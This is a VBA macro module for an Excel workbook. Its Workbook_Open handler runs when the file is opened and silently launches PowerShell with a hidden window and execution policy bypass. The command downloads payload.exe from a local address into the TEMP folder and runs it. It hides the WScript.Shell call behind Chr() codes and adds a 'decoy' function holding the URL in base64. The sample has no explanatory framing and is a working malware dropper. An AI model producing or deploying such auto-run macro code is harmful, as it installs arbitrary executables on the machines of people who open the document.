Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim cmd As String
    Dim objShell As Object
    Dim url As String, outPath As String
    url = "http://127.0.0.1:9090/payload.exe"
    outPath = Environ("TEMP") & "\oblivionx_payload.exe"
    cmd = "powershell.exe -NoProfile -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -Command " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set objShell = CreateObject(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108))
    objShell.Run cmd, 0, False
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
